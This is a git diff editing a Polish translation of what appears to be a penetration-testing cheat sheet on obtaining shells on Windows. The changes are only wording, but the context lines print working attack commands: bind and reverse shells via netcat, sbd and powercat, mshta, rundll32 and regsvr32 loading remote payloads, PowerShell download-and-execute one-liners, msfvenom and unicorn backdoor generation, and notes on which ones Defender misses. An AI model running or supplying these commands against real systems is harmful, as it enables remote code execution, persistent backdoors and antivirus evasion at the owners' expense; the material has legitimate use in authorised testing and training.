@@ -5,7 +5,7 @@
 ## Lolbas
 
 Strona [lolbas-project.github.io](https://lolbas-project.github.io/) jest dla Windows, tak jak [https://gtfobins.github.io/](https://gtfobins.github.io/) jest dla Linux.\
-Oczywiście, **nie ma plików SUID ani uprawnień sudo w Windows**, ale warto wiedzieć **jak** niektóre **binaries** mogą być (nadużywane) do wykonywania pewnych nieoczekiwanych działań, takich jak **wykonywanie dowolnego kodu.**
+Oczywiście, **nie ma plików SUID ani uprawnień sudo w Windows**, ale warto wiedzieć **jak** niektóre **binarne pliki** mogą być (nadużywane) do wykonywania pewnych nieoczekiwanych działań, takich jak **wykonywanie dowolnego kodu.**
 
 ## NC
 ```bash
@@ -27,7 +27,7 @@ ncat -l <PORT eg.443> --ssl
 ```
 ## SBD
 
-**[sbd](https://www.kali.org/tools/sbd/) to przenośna i bezpieczna alternatywa dla Netcat**. Działa na systemach podobnych do Unix i Win32. Dzięki funkcjom takim jak silne szyfrowanie, wykonywanie programów, konfigurowalne porty źródłowe i ciągłe ponowne łączenie, sbd oferuje wszechstronne rozwiązanie do komunikacji TCP/IP. Dla użytkowników systemu Windows wersja sbd.exe z dystrybucji Kali Linux może być używana jako niezawodny zamiennik dla Netcat.
+**[sbd](https://www.kali.org/tools/sbd/) to przenośna i bezpieczna alternatywa dla Netcat**. Działa na systemach podobnych do Unix i Win32. Dzięki funkcjom takim jak silne szyfrowanie, wykonywanie programów, konfigurowalne porty źródłowe i ciągłe ponowne łączenie, sbd oferuje wszechstronne rozwiązanie dla komunikacji TCP/IP. Dla użytkowników systemu Windows wersja sbd.exe z dystrybucji Kali Linux może być używana jako niezawodny zamiennik dla Netcat.
 ```bash
 # Victims machine
 sbd -l -p 4444 -e bash -v -n
@@ -109,7 +109,7 @@ mshta http://webserver/payload.hta
 ```bash
 mshta \\webdavserver\folder\payload.hta
 ```
-#### **Przykład odwrotnej powłoki hta-psh (użyj hta do pobrania i wykonania tylnej furtki PS)**
+#### **Przykład odwrotnej powłoki hta-psh (użyj hta do pobrania i wykonania tylnego wejścia PS)**
 ```xml
 <scRipt language="VBscRipT">CreateObject("WscrIpt.SheLL").Run "powershell -ep bypass -w hidden IEX (New-ObjEct System.Net.Webclient).DownloadString('http://119.91.129.12:8080/1.ps1')"</scRipt>
 ```
@@ -161,7 +161,7 @@ msf exploit(windows/misc/hta_server) > exploit
 ```bash
 Victim> mshta.exe //192.168.1.109:8080/5EEiDSd70ET0k.hta #The file name is given in the output of metasploit
 ```
-**Wykryte przez obrońcę**
+**Wykryte przez defendera**
 
 ## **Rundll32**
 
@@ -175,7 +175,7 @@ rundll32 \\webdavserver\folder\payload.dll,entrypoint
 ```bash
 rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";o=GetObject("script:http://webserver/payload.sct");window.close();
 ```
-**Wykryte przez obrońcę**
+**Wykryte przez defendera**
 
 **Rundll32 - sct**
 
@@ -219,12 +219,12 @@ regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll
 ```
 regsvr32 /u /n /s /i:\\webdavserver\folder\payload.sct scrobj.dll
 ```
-**Wykryte przez obrońcę**
+**Wykryte przez defendera**
 
 #### Regsvr32 -sct
 
 [**Stąd**](https://gist.github.com/Arno0x/81a8b43ac386edb7b437fe1408b15da1)
-```markup
+```html
 <?XML version="1.0"?>
 <!-- regsvr32 /u /n /s /i:http://webserver/regsvr32.sct scrobj.dll -->
 <!-- regsvr32 /u /n /s /i:\\webdavserver\folder\regsvr32.sct scrobj.dll -->
@@ -249,7 +249,7 @@ set lhost 10.2.0.5
 run
 #You will be given the command to run in the victim: regsvr32 /s /n /u /i:http://10.2.0.5:8080/82j8mC8JBblt.sct scrobj.dll
 ```
-**Możesz bardzo łatwo pobrać i uruchomić zombi Koadic za pomocą stagera regsvr**
+**Możesz bardzo łatwo pobrać i uruchomić zombi Koadic używając stagera regsvr**
 
 ## Certutil
 
@@ -280,7 +280,7 @@ msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 -f vbs > sh
 \\webdavserver\folder\batchfile.bat
 ```
 Proces wykonujący wywołanie sieciowe: **svchost.exe**\
-Ładunek zapisany na dysku: **lokalna pamięć podręczna klienta WebDAV**
+Ładunek zapisany na dysku: **WebDAV client local cache**
 ```bash
 msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 > shell.bat
 impacket-smbserver -smb2support kali `pwd`
@@ -345,9 +345,9 @@ Kompiluj kod C# na maszynie ofiary.
 ```
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /out:shell.exe shell.cs
 ```
-Możesz pobrać podstawowy reverse shell w C# stąd: [https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc](https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc)
+Możesz pobrać podstawowy C# reverse shell stąd: [https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc](https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc)
 
-**Nie wykryty**
+**Nie wykryto**
 
 ## **Regasm/Regsvc**
 
@@ -379,7 +379,7 @@ W folderze **Shells** znajduje się wiele różnych powłok. Aby pobrać i wykon
 ```
 Invoke-PowerShellTcp -Reverse -IPAddress 10.2.0.5 -Port 4444
 ```
-Rozpocznij serwowanie skryptu na serwerze WWW i wykonaj go po stronie ofiary:
+Rozpocznij serwowanie skryptu na serwerze internetowym i wykonaj go po stronie ofiary:
 ```
 powershell -exec bypass -c "iwr('http://10.11.0.134/shell2.ps1')|iex"
 ```
@@ -395,7 +395,7 @@ Pobierz, uruchom serwer WWW, uruchom nasłuchiwacz i wykonaj to po stronie ofiar
 ```
 powershell -exec bypass -c "iwr('http://10.2.0.5/powercat.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
 ```
-Defender nie wykrywa tego jako złośliwego kodu (jeszcze, 3/04/2019).
+Defender nie wykrywa go jako złośliwego kodu (jeszcze, 3/04/2019).
 
 **Inne opcje oferowane przez powercat:**
 
@@ -434,7 +434,7 @@ Utwórz wersję powershell backdoora metasploit za pomocą unicorn
 ```
 python unicorn.py windows/meterpreter/reverse_https 10.2.0.5 443
 ```
-Uruchom msfconsole z utworzonego zasobu:
+Uruchom msfconsole z utworzonym zasobem:
 ```
 msfconsole -r unicorn.rc
 ```
